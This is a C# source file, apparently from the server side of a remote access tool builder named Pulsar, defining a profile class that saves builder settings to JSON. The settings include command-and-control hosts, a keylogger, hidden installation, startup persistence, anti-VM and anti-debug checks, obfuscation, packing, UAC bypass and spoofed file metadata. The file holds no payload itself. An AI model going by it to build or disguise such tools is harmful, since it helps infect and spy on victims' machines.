using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Pulsar.Server.Models
{
    public class BuilderProfile
    {
        private readonly string _profilePath;
        private BuilderProfileModel _model;

        public string Hosts
        {
            get => _model.Hosts;
            set
            {
                _model.Hosts = value;
                Save();
            }
        }

        public string Pastebin
        {
            get => _model.Pastebin;
            set
            {
                _model.Pastebin = value;
                Save();
            }
        }

        public string Tag
        {
            get => _model.Tag;
            set
            {
                _model.Tag = value;
                Save();
            }
        }

        public int Delay
        {
            get => _model.Delay;
            set
            {
                _model.Delay = value;
                Save();
            }
        }

        public string Mutex
        {
            get => _model.Mutex;
            set
            {
                _model.Mutex = value;
                Save();
            }
        }

        public bool InstallClient
        {
            get => _model.InstallClient;
            set
            {
                _model.InstallClient = value;
                Save();
            }
        }

        public string InstallName
        {
            get => _model.InstallName;
            set
            {
                _model.InstallName = value;
                Save();
            }
        }

        public short InstallPath
        {
            get => _model.InstallPath;
            set
            {
                _model.InstallPath = value;
                Save();
            }
        }

        public string InstallSub
        {
            get => _model.InstallSub;
            set
            {
                _model.InstallSub = value;
                Save();
            }
        }

        public bool HideFile
        {
            get => _model.HideFile;
            set
            {
                _model.HideFile = value;
                Save();
            }
        }

        public bool HideSubDirectory
        {
            get => _model.HideSubDirectory;
            set
            {
                _model.HideSubDirectory = value;
                Save();
            }
        }

        public bool AddStartup
        {
            get => _model.AddStartup;
            set
            {
                _model.AddStartup = value;
                Save();
            }
        }

        public string RegistryName
        {
            get => _model.RegistryName;
            set
            {
                _model.RegistryName = value;
                Save();
            }
        }

        public bool ChangeIcon
        {
            get => _model.ChangeIcon;
            set
            {
                _model.ChangeIcon = value;
                Save();
            }
        }

        public string IconPath
        {
            get => _model.IconPath;
            set
            {
                _model.IconPath = value;
                Save();
            }
        }

        public bool ChangeAsmInfo
        {
            get => _model.ChangeAsmInfo;
            set
            {
                _model.ChangeAsmInfo = value;
                Save();
            }
        }

        public bool Keylogger
        {
            get => _model.Keylogger;
            set
            {
                _model.Keylogger = value;
                Save();
            }
        }

        public string LogDirectoryName
        {
            get => _model.LogDirectoryName;
            set
            {
                _model.LogDirectoryName = value;
                Save();
            }
        }

        public bool HideLogDirectory
        {
            get => _model.HideLogDirectory;
            set
            {
                _model.HideLogDirectory = value;
                Save();
            }
        }

        public bool EnablePastebin
        {
            get => _model.EnablePastebin;
            set
            {
                _model.EnablePastebin = value;
                Save();
            }
        }

        public bool EnableAntiVM
        {
            get => _model.EnableAntiVM;
            set
            {
                _model.EnableAntiVM = value;
                Save();
            }
        }

        public bool EnableAntiDebug
        {
            get => _model.EnableAntiDebug;
            set
            {
                _model.EnableAntiDebug = value;
                Save();
            }
        }

        // New properties for the missing checkboxes
        public bool EnableObfuscate
        {
            get => _model.EnableObfuscate;
            set
            {
                _model.EnableObfuscate = value;
                Save();
            }
        }

        public bool EnablePack
        {
            get => _model.EnablePack;
            set
            {
                _model.EnablePack = value;
                Save();
            }
        }

        public bool EnableCriticalProcess
        {
            get => _model.EnableCriticalProcess;
            set
            {
                _model.EnableCriticalProcess = value;
                Save();
            }
        }

        public bool EnableUACBypass
        {
            get => _model.EnableUACBypass;
            set
            {
                _model.EnableUACBypass = value;
                Save();
            }
        }

        public string ProductName
        {
            get => _model.ProductName;
            set
            {
                _model.ProductName = value;
                Save();
            }
        }

        public string Description
        {
            get => _model.Description;
            set
            {
                _model.Description = value;
                Save();
            }
        }

        public string CompanyName
        {
            get => _model.CompanyName;
            set
            {
                _model.CompanyName = value;
                Save();
            }
        }

        public string Copyright
        {
            get => _model.Copyright;
            set
            {
                _model.Copyright = value;
                Save();
            }
        }

        public string Trademarks
        {
            get => _model.Trademarks;
            set
            {
                _model.Trademarks = value;
                Save();
            }
        }

        public string OriginalFilename
        {
            get => _model.OriginalFilename;
            set
            {
                _model.OriginalFilename = value;
                Save();
            }
        }

        public string ProductVersion
        {
            get => _model.ProductVersion;
            set
            {
                _model.ProductVersion = value;
                Save();
            }
        }

        public string FileVersion
        {
            get => _model.FileVersion;
            set
            {
                _model.FileVersion = value;
                Save();
            }
        }

        public BuilderProfile(string profileName)
        {
            if (string.IsNullOrEmpty(profileName)) 
                throw new ArgumentException("Invalid Profile Path");
            
            _profilePath = Path.Combine(Application.StartupPath, "Profiles", profileName + ".json");
            Load();
        }

        private void Load()
        {
            try
            {
                if (File.Exists(_profilePath))
                {
                    string json = File.ReadAllText(_profilePath);
                    _model = JsonConvert.DeserializeObject<BuilderProfileModel>(json) ?? new BuilderProfileModel();
                }
                else
                {
                    _model = new BuilderProfileModel();
                    _model.Mutex = Guid.NewGuid().ToString();
                    Save();
                }
            }
            catch
            {
                _model = new BuilderProfileModel();
                _model.Mutex = Guid.NewGuid().ToString();
            }
        }

        private void Save()
        {
            try
            {
                var dir = Path.GetDirectoryName(_profilePath);
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                }

                string json = JsonConvert.SerializeObject(_model, Formatting.Indented);
                File.WriteAllText(_profilePath, json);
            }
            catch
            {
                Debug.WriteLine("Failed to save");
            }
        }
    }
}
